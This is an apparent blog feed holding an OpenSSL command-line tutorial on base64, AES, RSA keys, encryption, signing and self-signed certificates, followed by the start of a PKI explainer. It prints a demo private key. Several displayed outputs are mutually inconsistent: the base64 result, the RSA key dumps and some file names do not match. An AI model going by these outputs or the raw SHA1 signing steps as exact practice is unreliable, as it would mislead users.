**_OpenSSL_** is a command-line utility that facilitates cryptographic operations such as symmetric or asymmetric encryption, public-key
cryptography, hash functions, digital signatures etc. You can download the source code from [http://www.openssl.org](http://www.openssl.org/).
This guide will cover just the basic functionalities of the OpenSSL.
&lt;br&gt;&lt;br&gt;After the installation check for the version.
{% highlight bash %}
root@bbsec:~$ openssl version
OpenSSL 1.1.1m  14 Dec 2021
{% endhighlight %}&lt;br&gt;
OpenSSL contains various commands. Here is the list of them.
{% highlight bash %}
root@bbsec:~$ openssl help
Standard commands
asn1parse         ca                ciphers           cms               
crl               crl2pkcs7         dgst              dhparam           
dsa               dsaparam          ec                ecparam           
enc               engine            errstr            gendsa            
genpkey           genrsa            help              list              
nseq              ocsp              passwd            pkcs12            
pkcs7             pkcs8             pkey              pkeyparam         
pkeyutl           prime             rand              rehash            
req               rsa               rsautl            s_client          
s_server          s_time            sess_id           smime             
speed             spkac             srp               storeutl          
ts                verify            version           x509 
{% endhighlight %}&lt;br&gt;

Brief descriptions for some parameters:
- **ca**: Create certificate authorities.
- **dgst**: Compute hash functions.
- **enc**: Encryption/decryption via secret key algorithms such as a secret key stored in a file or using a password.
- **genrsa**: Create a pair of private/public keys by using the RSA algorithm.
- **password**: &quot;Hashed password&quot; generator.
- **pkcs7**: Management tools for PKCS#7 standard.
- **pkcs12**: Management tools for PKCS#12 standard.
- **rsa**: Data management for RSA.
- **rsautl**: Sign/Verif a digital signature or encrypt/decrypt with RSA.
- **rand**: Pseudo-random bit string generator.
- **verify**: X.509 digital certificate verifier.
- **x509**: Data management for X509.


# 2-SECRET KEY ALGORITHMS

It is possible to implement various types of secret key algorithms with OpenSSL. Here is the list of them.

{% highlight bash %}
root@bbsec:~$ openssl help
...
...
...
Cipher commands:
aes-128-cbc       aes-128-ecb       aes-192-cbc       aes-192-ecb       
aes-256-cbc       aes-256-ecb       aria-128-cbc      aria-128-cfb      
aria-128-cfb1     aria-128-cfb8     aria-128-ctr      aria-128-ecb      
aria-128-ofb      aria-192-cbc      aria-192-cfb      aria-192-cfb1     
aria-192-cfb8     aria-192-ctr      aria-192-ecb      aria-192-ofb      
aria-256-cbc      aria-256-cfb      aria-256-cfb1     aria-256-cfb8     
aria-256-ctr      aria-256-ecb      aria-256-ofb      base64            
bf                bf-cbc            bf-cfb            bf-ecb            
bf-ofb            camellia-128-cbc  camellia-128-ecb  camellia-192-cbc  
camellia-192-ecb  camellia-256-cbc  camellia-256-ecb  cast              
cast-cbc          cast5-cbc         cast5-cfb         cast5-ecb         
cast5-ofb         des               des-cbc           des-cfb           
des-ecb           des-ede           des-ede-cbc       des-ede-cfb       
des-ede-ofb       des-ede3          des-ede3-cbc      des-ede3-cfb      
des-ede3-ofb      des-ofb           des3              desx              
idea              idea-cbc          idea-cfb          idea-ecb          
idea-ofb          rc2               rc2-40-cbc        rc2-64-cbc        
rc2-cbc           rc2-cfb           rc2-ecb           rc2-ofb           
rc4               rc4-40            seed              seed-cbc          
seed-cfb          seed-ecb          seed-ofb          sm4-cbc           
sm4-cfb           sm4-ctr           sm4-ecb           sm4-ofb           

{% endhighlight %}&lt;br&gt;

The list includes the _base64_ encoding standard. It is not a secret key algorithm since no secret key generated for
base64. This encoding standard converts binary input into alphanumeric characters and vice versa.
{% highlight bash %}
root@bbsec:~$ echo &quot;www.bbsec.net&quot; &gt; plaintext.txt
root@bbsec:~$ openssl enc -base64 -in textfile.txt
YmJzZWNuZXQK
root@bbsec:~$ echo &quot;YmJzZWNuZXQK&quot; &gt; encoded.txt
root@bbsec:~$ openssl enc -base64 -d -in encoded.txt
bbsecnet
{% endhighlight %}&lt;br&gt;
On the contrary, [Advanced Encryption Standard (AES)](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) is indeed a secret key algorithm.
AES algorithm requires a secret password as a key to encrypt data. So let us see how it works.

{% highlight bash %}
root@bbsec:~$ openssl enc -aes-256-cbc -pbkdf2 -in plaintext.txt -out encrtpyed.bin
enter aes-256-cbc encryption password:
Verifying - enter aes-256-cbc encryption password:

root@bbsec:~$ cat encrtyped.bin
root@bbsec:~$ &quot;Salted__W���U�j���í��R&apos;���#��b�&quot;
root@bbsec:~$ hexdump encrtpyed.bin 
0000000 6153 746c 6465 5f5f d357 dfd9 dd55 856a
0000010 aab8 adc3 a881 2752 f6b5 23f5 84a8 fe62
0000020
root@bbsec:~$ file encrtpyed.bin 
encrtpyed.bin: openssl encrypted data with salted password

root@bbsec:~$ openssl enc -d -aes-256-cbc -pbkdf2 -in encrtpyed.bin -pass pass:111111
www.bbsec.net
{% endhighlight %}&lt;br&gt;

# 3-PUBLIC KEY CRYPTOGRAPHY

This section will demonstrate how the OpenSSL manages public key algorithms. Therefore we will use one of the most common
public-key cryptography algorithm RSA.

## 3.1-Generating the Key Pair

First, we need to create an RSA public/private key pair. We will create a 2048 bit key.
{% highlight bash %}
root@bbsec:~$ openssl genrsa -out privkey.pem 2048
Generating RSA private key, 2048 bit long modulus (2 primes)
..............+++++
......................................................................................................+++++
e is 65537 (0x010001)
root@bbsec:~$ cat privkey.pem 
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA4tX0r+2pX9Mssky5Kz9ZNEvDswLjzNgO8cojNA6eHA8VSSGr
XUsbewpH89wAgZzmEk2whV28ktMh7y75HSm3b7D7bpun8ODACLaA5TpsMNdJtrG+
6kjw0Sex6RMOHoLya5Bv2bD+AtqqLNKTo5rBwKPpYs2fPOeTVFomSnyO6S1GiBNM
KD8AdBk7bLS9ejsqyv6j9q2fiL6SDeNFXup9mF3e+lb0wXfpkP7db4m06Ci1zkSb
cv4bDNXS/P0As+1Rjbu9QCFhypUFdfwR1BHl7fYxIY/HCxMXWq0xXlxmGybEGCn7
UJWWgDvqx4PbmueXWIOuAtHJ/wu6HXH43/4ztQIDAQABAoIBAA94tGXDegf1KVlH
7mFKwtTUThbJnav9GJfZR6lnTdVwGe2RBFUqqEcuHlY9rTMp9m9NKTsPd6s0B15+
/7LDg6V0ltGmgD/ntHFjsUrxPyvdo0N4wCLOss4xPOs+x3nBSLOZeGeKsOiU7YJ9
ImDIT2rKQ0Lf73qB+QSJ2Y6/DChPM17d4ZnI8gfINlrOLAvl8VAZTX+4HP7wOYAW
m9nwZ8NXvudjk6vFs5m2K2t5iZpANeLMmmTanfM4/vhHBWyVAJfT/ZpBts3Agwdw
RltplK+n/4/G1AzyoQpQcuNmuATSNqiiLuAno+UM6oqY1t31q0jObHpRIfEcS6Bo
8YhTXskCgYEA8jM6p22JYv4WGoyEdiPeVJwMFj2AoTpdqEo19+fkvHhI1MBN8E7d
qJ+mP3wChP2GEmDeW+wOqRAncJlVbh/nfH/t4WWUv6pYIwWfJ8IvgeWzbz8Wdat+
y72ut+Mu5CCIfOmZi9K58+2ObMlNFR87yK3mRsl/fa5X2fJi9i2rb6sCgYEA78Ke
qKSSWM8cjHyB5dvN0dQUtcEZ8EWagJjyX9/tfRond4x6PPQvTtX742I8GdJ6T95s
esatTw+kEIim5wSXsM+wdEtMFfU1n6oEYrMpg+sgyIp72QDQi3kr/j5Dpb4DOAOQ
Hrh5Pbyq/uFFPPzX1aBSphCRKqBLmcyk1X6dCh8CgYEA8Pc9DOSzApVPAnz5MN0A
z2cts1bfSglasxuaVBoX/dcihuEI6eRdLe4gphrIGu5tXI2ZzRSvhU64HpO/ZkBB
vCE/V7gL5SEibT2jmhfd0jvpaO34d3v3O9dtJDDYL0ma4cQ76tvt/B1GTT99/FzF
yyQQ7i59NFqntwQrp0fKv98CgYAfolcauzQQAauroZXmBR1f7RKadJL+j8B17Tg1
jC8ijXvdmyxZtII1bahhdQmnAo1e0mMPw/0D7HViNRWIb6OwEYcfoPu1/feITH9t
omP84t4dd6AlnqTlciRq1D5KtQpprpaqZv6gNa9+F6zyAg5cQl4FSTROIn43Gbg5
7w27UwKBgQDeuuDoYqszBhembtG7sT7+5Anryw5qazYxXND1nw6ikU1T9t50wr4P
oVUmGx78XnzTrLLRXG7YNIRxyih9lk07zyvWpe+4MvLNZt2Fsv68uAFXfRhCex6i
2tuq+ge7jLSujkdU3uN8pV5VPEPs9lWsM9lrmbMjO/GMx0SHd5f49g==
-----END RSA PRIVATE KEY-----
{% endhighlight %}&lt;br&gt;
A single privkey.pem file is created. The private key is encoded with the Privacy Enhanced Email (PEM) standard. 
That file contains both private and public keys. This is not what we want since
the private key must be kept secure while the public key should be distributed publicly since other people needs that public key to 
send encrypted messages to you (or to control if a document or a certificate has been signed by you).
&lt;br&gt;&lt;br&gt;The way to extract public key inside from the 
privkey.pem file as follows:
{% highlight bash %}
root@bbsec:~$ openssl rsa -in privkey.pem -pubout &gt; pubkey.pem
writing RSA key
root@bbsec:~$ cat pubkey.pem 
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzqi5qVmfLf+lCaWGbZ43
iAb3Hofr9MdIUL6i7lxIkViq8xwF90ThiKdgQ5Qn6heacXmQx0aJ9+F+HqpS47Na
aBz/NyHbzID8tSHwE6LhgS5gSsW2yl4/R5Zj3SMndZdJj9ExX6lesJDesOnzIEt7
6JMnOUinbGm9Lmtu727qBJh0KlNKmK5zUsi5ZxFcfC0onfhGWNbP1floC6KQzdY5
tS3nB7bXeuRTC4qJEYkQoXbQ3U4pLpu4vIdslwfjConBEfA9/3nWyaCXsvsSmAfC
Bl4FQVDSUjWO7mpPUujs2V+wdlH7fWXzkTmtpWOO8XtBQpYIlOqCAChpELnAv6Rf
+wIDAQAB
-----END PUBLIC KEY-----
{% endhighlight %}&lt;br&gt;

The following output indicates the details of the RSA key pair. Those details strictly related to the RSA&apos;s algorithm therefore
if you are interested in the math behind the RSA algorithm, you can conduct a further investigation on it.
{% highlight bash %}
root@bbsec:~$ openssl rsa -in privkey.pem -text -noout
RSA Private-Key: (2048 bit, 2 primes)
modulus:
    00:b3:4e:f9:71:fc:3e:af:29:f9:63:a0:38:9b:3f:
    5f:e2:0a:32:32:0c:fa:4f:c7:e7:79:b5:9b:bf:5c:
    87:9a:75:d8:1e:a6:48:09:4f:3f:95:87:aa:d7:a1:
    5d:18:a2:13:27:c4:43:03:6b:8f:e6:81:70:9c:32:
    66:8f:97:32:11:8b:3c:b4:e5:60:5c:02:c9:4a:67:
    76:00:28:68:4c:23:24:63:88:7d:14:8f:9a:6a:56:
    72:03:cd:97:d9:e8:81:9a:af:94:2b:f5:07:ef:4d:
    8b:f9:fd:d5:c7:f2:c7:91:06:89:d3:4f:dd:24:9a:
    72:60:78:aa:7d:ed:e9:07:04:78:64:9a:5f:a2:fa:
    03:24:92:9f:d5:dd:8e:b9:11:f8:dd:99:3f:03:51:
    2a:63:77:2c:d8:89:a6:0c:80:e8:5b:e4:c6:5b:10:
    c0:c8:c4:ca:46:84:c7:df:72:f9:11:7e:c2:29:81:
    e6:4c:86:c0:c4:fe:6c:a0:a7:66:83:45:44:1e:59:
    93:4c:35:fc:fb:00:67:ed:63:a3:66:e3:6b:8b:b7:
    ab:bf:f8:51:1e:af:a4:e1:09:42:41:8f:75:82:cf:
    29:2e:0e:6a:c1:19:62:f1:a0:44:bc:ad:20:06:12:
    d8:a3:fa:d8:a6:a5:5a:c5:bf:f4:9d:1a:b9:b9:5e:
    6c:6f
publicExponent: 65537 (0x10001)
privateExponent:
    00:9d:a6:81:11:23:fb:a5:1c:9d:85:67:78:7d:9e:
    f1:d9:96:a7:5d:74:25:9c:81:a1:56:54:43:74:b3:
    91:12:50:2c:4d:7e:5b:75:bb:f4:a6:ae:da:99:ad:
    e9:61:60:16:c1:6f:00:90:80:40:cc:24:e0:72:a4:
    a9:a1:f4:08:74:7e:5c:48:9c:27:e5:9e:19:86:ce:
    82:64:4f:22:ac:56:75:87:01:99:1f:bb:c6:c3:59:
    ef:f2:c2:0f:91:ea:a8:10:ed:f0:b3:d9:43:39:b6:
    8f:ac:a3:ee:13:57:b4:f9:20:ab:8b:5b:fb:8e:54:
    30:dd:fb:19:c3:90:aa:c2:9c:45:cc:a2:3f:05:57:
    4a:7a:d1:21:99:1e:bc:75:ef:8e:6d:44:48:2c:91:
    5b:2b:c7:56:44:ba:f0:7a:4a:45:de:87:6f:91:c9:
    06:9a:15:eb:3f:7b:dd:aa:47:1e:0e:8f:4c:e7:c5:
    0e:6f:b3:dd:6d:2a:99:8f:f0:8c:e1:48:e6:af:8b:
    29:3d:31:9f:94:4d:5a:76:58:42:d3:49:7d:c9:dd:
    b3:56:d0:09:8b:95:5e:08:ab:94:98:5b:9e:d4:29:
    21:8a:a6:2d:a9:2a:58:da:3f:7f:ce:0e:97:d2:06:
    a1:98:c4:4e:1f:91:05:ad:7a:d0:ab:e1:b2:69:07:
    3d:79
prime1:
    00:d8:9e:75:b1:1e:c2:f2:3f:1e:71:81:d5:6c:fe:
    40:3e:38:0d:30:2e:2c:14:36:3c:d7:09:30:58:04:
    df:dd:e7:54:d2:67:67:3d:c7:79:eb:c4:c4:5b:58:
    1a:0d:db:49:c8:0b:b9:26:19:ae:da:83:29:a3:96:
    d2:c6:df:37:53:33:7e:35:5b:54:4b:32:c2:dc:76:
    f2:8a:99:56:67:87:24:53:7d:3e:aa:90:d0:a7:06:
    70:42:4d:ca:5e:31:52:49:98:c1:08:1b:e5:24:50:
    2f:41:12:d2:f3:1a:c4:c4:c6:08:11:ac:c8:29:08:
    7f:ad:02:f2:99:28:e9:f7:5b
prime2:
    00:d3:e8:11:88:df:ce:96:de:84:0f:ed:e8:52:af:
    cb:e9:6d:0b:67:b5:20:a5:1c:52:17:3c:a6:79:ca:
    65:0c:75:bd:01:d6:ce:cc:74:0d:80:de:3a:81:f5:
    d2:d6:59:84:55:2a:d2:f4:7c:be:74:6e:8d:73:d8:
    47:7c:18:33:22:f4:78:cb:83:43:b0:db:c0:eb:8e:
    cf:d9:27:10:3f:5d:10:c9:79:90:d5:31:33:f8:a2:
    27:3d:77:c5:0a:98:54:2c:89:d1:9e:c4:bf:83:88:
    21:0e:7a:b2:e3:5b:47:a9:f1:9f:21:f7:34:e2:bc:
    16:de:11:94:07:5e:c7:ff:7d
exponent1:
    00:c4:73:38:d3:0f:cd:c6:7a:1d:b6:dd:03:5c:9c:
    5c:50:d0:ee:8c:f2:62:c1:55:ca:e9:4d:89:0d:5a:
    26:58:8d:92:2c:5a:e0:93:73:93:8b:91:60:6e:62:
    c1:06:2e:08:84:a6:b5:1b:eb:90:da:d4:b6:ef:88:
    39:d1:67:e0:39:d1:6a:35:23:85:97:c9:0a:55:7c:
    7e:4b:d9:f2:35:63:a7:3b:1c:4b:b7:ce:2b:9c:3e:
    47:92:aa:0f:cc:4a:b8:90:cc:3a:cb:8a:d8:cd:8c:
    f6:bd:f2:3f:63:7f:b4:51:ac:32:e7:2c:a6:3e:28:
    59:f9:e2:c1:76:cb:57:1c:1f
exponent2:
    2f:04:45:a7:b5:e8:b3:86:c9:8c:73:3f:e1:e0:c9:
    80:90:46:40:8b:6a:a3:d7:c5:cb:0c:14:ef:de:dd:
    4e:c7:6c:d9:54:9c:eb:b6:30:2c:d0:a1:f0:a5:e7:
    52:d1:e7:cf:b1:c1:be:a7:52:e6:a8:84:d0:18:43:
    bc:1f:ee:70:aa:07:87:38:27:b3:bc:fe:70:05:6e:
    ce:82:a1:53:3d:c5:f4:bd:f9:49:a4:32:20:cf:71:
    9f:6c:cc:96:4e:38:16:ed:b9:49:dd:e3:94:3e:86:
    ff:1c:70:46:8b:c1:39:ce:b7:7d:24:c9:62:29:53:
    75:90:36:e4:ef:bd:b6:4d
coefficient:
    00:b6:68:f2:3a:23:18:0d:a1:4e:9d:df:b1:42:8b:
    a4:cb:73:64:45:96:92:df:92:a8:40:7d:5d:f2:bf:
    f6:5f:6d:3e:b9:5f:b2:d1:08:a2:6b:e8:c2:1e:a4:
    76:72:5b:bf:f1:55:41:90:f6:b4:e0:f3:76:84:a1:
    15:91:a4:bf:d9:08:ed:a4:a6:be:42:bf:7c:27:a4:
    1f:81:0f:b6:33:bf:e5:78:a3:a9:43:77:48:ec:ce:
    fc:d4:55:73:a0:58:f8:fb:2b:7c:9c:7b:4e:19:dd:
    50:2d:91:a5:16:cc:68:48:7f:15:b5:2e:14:cb:82:
    41:73:29:70:a0:fc:a5:11:04
{% endhighlight %}&lt;br&gt;
To encrypt the private key and enhance its&apos; security, we can use symmetric key cryptography, such as DES3.
{% highlight bash %}
root@bbsec:~$ openssl rsa -in privkey.pem -des3 -out enc-priv-key.pem
writing RSA key
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
root@bbsec:~$ cat enc-priv-key.pem 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,00672B83BD258084

tiqDxmmKct026+B6ZcahTuYSgWOjSJvogkjuZc+V8SUo37NOBRWv4Ie7CEfzqOOu
WKzr8gn8WFaRgfI0W+fgsXk8TZ/9yLUB/tVF3kxaM28bItvazJSkk6XLqAsqhJu8
sXhEyi69HlyYeCXdasBjZdoEc+ma5QjGP5VYZ7wZyak6jhxn2ExH+JfkS+3l9uYi
NeD61SLo7unqV44Rl+SDCYxYN6G60Jqv6wuoG8abBadEzo9nXIBMJ2gy0H1uSSqW
ECqRB4V5T4pA9RfuolCl0x76IUWY0ZLRIBLH//pGU+KBG2ZqsFIPg/Fsh/hOfCsL
rGE/rm60wuG7bUs7qbSe0ZjF6Ktu8VdkEfwzezBuhuWSgVy1UBPZxmRzYvO64yuG
k0TLFXzhwxSeR/UJ+GRQAt2e/U6MUw6E2ktUHUAIisyLqJgbU07Xg/nSBn3Lv6aU
5hABRIijp7yAK94HAFOdkliStgO0N3X/ozJyznN/JPW6Cs8GAetiIlyKbGgIxHsH
HOqjS/Zckd82+X3npqU7DFJ6uJ1BwGBQjwTL/r92OVQSp3Rj2sIkj6n087s+iHSm
Gu/w+lBSuIvJyQH8YV/6OmDUHVR6mjOOqP2xZmSN14GxlufW8f7I/iOw4bXRIaV/
PB/VXjjoh8V9VCI8Rcpm9kn/YP75iIfBQR3eYHnVP56C434vDd/moJej7JSJcxbJ
kGPo6l35XDKhZ2rekr0ePiinhYY/BK98MsYIYxxLvL55QrjHI2H0RaNmp71UDQG9
UL1d9sAWyKXSIjF2HKCRUm1+q/r9M8OLSCQBaOZ0H716dvtr7bZ+AXACO4JSYxCT
Un2LMxM78hJ3If5Kb1C/k1OCV/BVJbVaU/ySQ+OzOVncLHYBG7jm7Ezuq5DT6v/O
1KPX4/jomd2C4ZZiBK/G4hV6MT0cVFhJv+ThKLqekXQuNkbcAojf2ndowwxkeCye
nU61PISBXI7uBLmCuJEgQy4THWbCMKgL+nUHLrshwJwyaHkzXG2MMjTcOZj0RTpZ
Il3zImidoFR7JEuBl6hkJlZvljmUSIf1+hZUnYYQWhEoPx3SXVanIm/rJrgaxTxC
k7m15T0DGdhEnAcebYChx11hH/jyRuAz31LcrgzVFfvYFJHKkboAgAc7Zoi1gU+0
mDLnsW/18jWcMO6FU6+Mh5XUWoWe7tMerwYDfZKJuumxii2ufNRZXiPoLoDq4em7
d9uQspcsr+IQG7ByB+l9Y+Lk6ymPlMR34afSnG5qHUSmgB01zyV7ov1beyivOdyl
Ja9DQCuR0KcA1HvLCa1G94QiQ2AHTAsS3mBA8rDGXqOls76lmDF+m2J+7+6XB+e3
DZstVBKti0VCfZnY4l5gW+LGCUup5OUn/NJrAT3veh9TjbxSWEd2ZfA7fdS0zfjP
d7xal0w7v30eD6l4Vx7HXjm6KF9VH+uLL41exWn/8t1LmqGIKzPwRCNVOrN6NWg7
vuMKYMuBl5yza/vfMdeGIlL4fags+EMVC3yz4+xKtHTB/aRRcigNB6hBsrCo8L+S
C1Yr6FdrosL12DFP3UFFvva58jwR+EkGQfSUjZmY67PFLcn93bzkTfV8hmPFjy9j
-----END RSA PRIVATE KEY-----

{% endhighlight %}&lt;br&gt;
Since the private key is encrypted with DES3, you must decrypt the private key back with DES3&apos;s passphrase when you 
want to decrypt messages encrypted with your public key.

## 3.2-Encryption

Since we have created the RSA key pair, we can produce a digital signature or perform encryption.
{% highlight bash %}
root@bbsec:~$ echo &quot;this file will be encrtyped with rsa&quot; &gt; plaintext.txt
root@bbsec:~$ cat plaintext.txt
this file will be encrtyped with rsa
root@bbsec:~$
root@bbsec:~$ openssl rsautl -encrypt -in plaintext.txt -pubin -inkey pubkey.pem &gt; enc-text.txt
root@bbsec:~$ cat enc-text.txt 
&quot;@X|aTvr
        3�K���G-U��qz�F��YXm8��4=v��$6w^��̫&lt;�����KH�]��
                                                      ��
��E��w-|��h;}[ݡ;)77��u��?��ޣ���Ù���P�t&apos;�T�&quot; 
{% endhighlight %}&lt;br&gt;
To decrypt the encrypted txt file, use the private key.
{% highlight bash %}
root@bbsec:~$ openssl rsautl -decrypt -in enc-text.txt -inkey privkey.pem 
this file will be encrtyped with rsa
{% endhighlight %}&lt;br&gt;

## 3.3-Digital Signatures

In this section, we will be creating a digital signature and verifying it. Since RSA can only encrypt data smaller than or equal to
the key length, first, we compute the digest of the data to sign it. Note that in practice, the procedure is a bit more complex.
The way of doing it in the real world is to implement a schema called [_RSA-PSS_](https://crypto.stackexchange.com/questions/57607/what-is-rsa-pss-and-how-is-it-different-from-a-hash).

### 3.3.1-Creating the data file then digesting it
In this instance, I will use the SHA1 hash function to digest the data.
{% highlight bash %}
root@bbsec:~$ echo &quot;this document will be signed&quot; &gt; plaintext.txt
root@bbsec:~$ openssl dgst -SHA1 plaintext.txt &gt; plaintext-sha1.txt
root@bbsec:~$ cat plaintext-sha1.txt
SHA1(plaintext.txt)= dc2fe0f7a744a48ded8ce61710c385457e35296a #Data&apos;s digest
{% endhighlight %}
### 3.3.2-Signing the digest with the private key
{% highlight bash %}
root@bbsec:~$ openssl rsautl -sign -in plaintext-sha1.txt -out signedfile -inkey privkey.pem 
root@bbsec:~$ cat signedfile 
&quot;�9�O��N�q�k������Kc��ګ�4ci��GC����6�vq���2�K�iy���Q�s���!*��P�����!M��s���/o�,�b���$iJ���������s��?4�!�a&quot;
{% endhighlight %}

### 3.3.3-Verifying the digital signature
{% highlight bash %}
root@bbsec:~$ openssl rsautl -verify -in signedfile -pubin -inkey pubkey.pem 
SHA1(plaintext.txt)= dc2fe0f7a744a48ded8ce61710c385457e35296a #Decrypted signature
{% endhighlight %}
As you can tell, the digest of the data and the result of the decrypted signature validates each other. That means signature is valid.

# 4-CREATING DIGITAL CERTIFICATES (PKI)

If you are not familiar with the _Public Key Infrastructure_, you can read it [here](https://www.bbsec.net/2022/01/01/public-key-infrastructure/).
## 4.1-Generate a key pair

{% highlight bash %}
root@bbsec:~$ openssl genrsa 2048 &gt; myprivatekey.pem
Generating RSA private key, 2048 bit long modulus (2 primes)
..........+++++
..................................................................+++++
e is 65537 (0x010001)
root@bbsec:~$ openssl rsa -in myprivatekey.pem -pubout &gt; mypublickey.pem
writing RSA key
{% endhighlight %}

## 4.2-Generate a CSR
{% highlight bash %}
openssl req -new -key myprivatekey.pem &gt; cert_req.csr

Country Name (2 letter code) [AU]:tr
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:Istanbul
Organization Name (eg, company) [Internet Widgits Pty Ltd]:BBSec
Organizational Unit Name (eg, section) []:Cyber-Sec
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:imbarisburak_buisiness@protonmail.com
A challenge password []:111111
An optional company name []: 
{% endhighlight %}
## 4.3-Act as our own CA to self-sign our own certificate
{% highlight bash %}
openssl x509 -req -in cert_req.csr -signkey myprivatekey.pem &gt; signed.cer
Signature ok
subject=C = tr, ST = Some-State, L = Istanbul, O = BBSec, OU = Cyber-Sec, emailAddress = imbarisburak_buisiness@protonmail.com
Getting Private key
{% endhighlight %}
## 4.4-Display all the information in the certificate
{% highlight bash %}
root@bbsec:~$ openssl x509 -in signed.cer -text -noout
Certificate:
    Data:
        Version: 1 (0x0)
        Serial Number:
            34:1c:a6:c0:0d:06:8f:2c:58:46:ae:1b:17:f1:53:b6:27:52:6c:f8
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C = tr, ST = Some-State, L = Istanbul, O = BBSec, OU = Cyber-Sec, emailAddress = imbarisburak_buisiness@protonmail.com
        Validity
            Not Before: Jan  5 19:52:19 2022 GMT
            Not After : Feb  4 19:52:19 2022 GMT
        Subject: C = tr, ST = Some-State, L = Istanbul, O = BBSec, OU = Cyber-Sec, emailAddress = imbarisburak_buisiness@protonmail.com
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (2048 bit)
                Modulus:
                    00:d4:4c:57:45:97:1b:30:d8:fa:b8:5d:52:9f:be:
                    21:d8:d2:11:4b:34:bc:55:53:00:5c:e9:00:9b:87:
                    2d:6b:b1:f8:9e:3a:75:fb:96:9a:31:41:c8:2a:5e:
                    54:10:20:9f:1c:36:4d:b2:6c:66:4e:80:d3:04:19:
                    9f:3a:1a:21:3b:d1:f5:cf:5f:a4:06:6c:b5:38:bb:
                    01:8f:1f:51:82:67:6a:32:01:2d:06:83:03:79:95:
                    42:63:1a:01:87:9e:bc:17:ba:1c:03:1c:a0:92:dd:
                    56:19:a0:eb:38:42:79:43:4b:f2:d8:28:9d:f6:5b:
                    59:38:27:b7:bc:e2:23:31:57:5f:9c:46:36:00:4c:
                    b9:a9:ba:1c:74:73:3c:ad:35:ed:60:02:03:53:28:
                    44:74:c9:e9:f9:05:7f:c1:9e:57:7e:09:c3:41:17:
                    5c:77:36:08:92:64:d4:73:e8:d1:eb:79:57:dd:04:
                    b8:b4:f2:20:f0:42:df:03:68:a3:ca:f0:69:66:a3:
                    46:d4:cd:69:cd:2b:32:8e:5d:06:5c:b8:b0:b5:78:
                    3e:72:1d:cf:95:78:ea:ea:85:60:05:0c:e6:0f:3b:
                    06:3f:78:54:7f:bb:23:d8:1b:25:d8:60:ef:a2:ee:
                    21:4a:4d:22:3b:80:6f:3b:b7:42:8e:86:66:aa:67:
                    54:c9
                Exponent: 65537 (0x10001)
    Signature Algorithm: sha256WithRSAEncryption
         8c:6f:7a:b2:a7:ed:96:ed:7c:26:93:6d:4e:6c:07:c4:1b:76:
         7e:ef:08:1a:4e:15:f8:35:38:dd:88:d3:67:1a:b7:56:ee:7b:
         6e:8a:a9:e3:05:2a:69:55:3c:ec:8b:c1:45:c4:dd:97:54:e6:
         5b:c6:e4:b0:ea:b2:00:e7:e1:f6:d2:46:b2:65:67:e1:d8:bb:
         f9:89:c1:93:05:7c:6a:8c:ef:c9:76:7a:e8:3e:cc:90:21:25:
         f3:c5:4a:9f:87:18:3c:cf:50:2a:7a:1e:b8:49:65:0e:d2:a0:
         d4:cb:8b:27:5a:40:76:ee:52:30:2a:3a:70:63:2d:97:a7:31:
         49:96:60:d9:d9:17:35:02:57:f0:cd:1f:b0:54:15:49:e3:5f:
         1d:19:fd:3e:ff:03:58:f5:cd:ec:f3:a9:9e:e5:ff:b9:bc:d8:
         3d:f3:0a:4f:f5:18:5b:b8:86:4a:cb:6f:89:40:f7:3e:f5:f0:
         6c:be:d0:fd:54:91:43:0f:aa:8a:58:b7:f9:80:c9:2c:07:38:
         f6:6b:18:54:e7:d5:00:8d:ad:36:0f:47:6f:01:d6:2c:79:1b:
         04:65:61:21:1d:e7:b2:72:5b:a5:ab:01:ca:f4:33:7e:26:69:
         e9:4f:dd:f9:c9:60:27:60:a2:0c:98:2d:d4:c9:28:c3:c7:5b:
         f2:51:34:b9
{% endhighlight %}
## 4.5-Put our certificate and key in a PKCS #12 container
{% highlight bash %}
root@bbsec:~$ openssl pkcs12 -export -in signed.cer -inkey myprivatekey.pem -out p12cert.p12
Enter Export Password:
Verifying - Enter Export Password:
{% endhighlight %}
## 4.6-Display information in a PKCS12 file
{% highlight bash %}
root@bbsec:~$ openssl pkcs12 -info -in p12cert.p12 
{% endhighlight %}
## 4.6-Create a key and a self-signed certificate in one command
{% highlight bash %}
openssl req -new -x509 -newkey rsa:2048 -out new_cert.cer -keyout new_key.pem
{% endhighlight %}
</description>
        <pubDate>Wed, 05 Jan 2022 14:00:00 +0000</pubDate>
        <link>http://localhost:4000/2022/01/05/OpenSSL-CLI-Tool/</link>
        <guid isPermaLink="true">http://localhost:4000/2022/01/05/OpenSSL-CLI-Tool/</guid>
        
        <category>OpenSSL</category>
        
        <category>PKI</category>
        
        <category>PKC</category>
        
        <category>Cryptography</category>
        
        <category>x509</category>
        
        <category>Encryption</category>
        
        
      </item>
    
      <item>
        <title>Public Key Infrastructure</title>
        <description>This post will discuss all the terminologies behind the **_Public Key Infrastructure (PKI)_**.
It is essential to have knowledge of _Public Key Cryptography_, _Encryption_ and _Digital Signing_ as the prequisition.

# WHAT IS PKI?
A [**_Public Key Infrastructure (PKI)_**](https://en.wikipedia.org/wiki/Public_key_infrastructure) is a collection of roles, policies, hardware, software, and procedures
required to produce, regulate, disperse, use, store, and revoke x.509 certificates and manage public-key encryption.
# WHY PKI IS IMPORTANT?
While public-key encryption solves the problem of the data&apos;s legibility by everyone, PKI adds authentication mechanism on top of it.
Combination of those two mechanism together makes online communication much more trustworthy.
# REAL LIFE SCENARIO

Let us examine this example:

- **John**: Hey Robert, can you send those confidential data to Ashley?
- **Robert**: Sure, but who is she?
- **John**: She is the HR manager of BBSec.
- **Robert**: All right.

&lt;br&gt;For Robert to send any confidential data to Ashley, he must find Ashley&apos;s public-key. However, searching for her
public-key on the web would not be smart since there could be many other public-keys for other Ashleys. How can Robert
be confident that he uses the correct public-key from the Ashley he wants to communicate?
&lt;br&gt;&lt;br&gt;To solve this problem, what we call **_x509 certificates_** comes into play.

# WHAT IS AN X.509 CERTIFICATE?

_X.509_ is a standard procedure for public-key certificates. They are digital documents that validate the integrity of the 
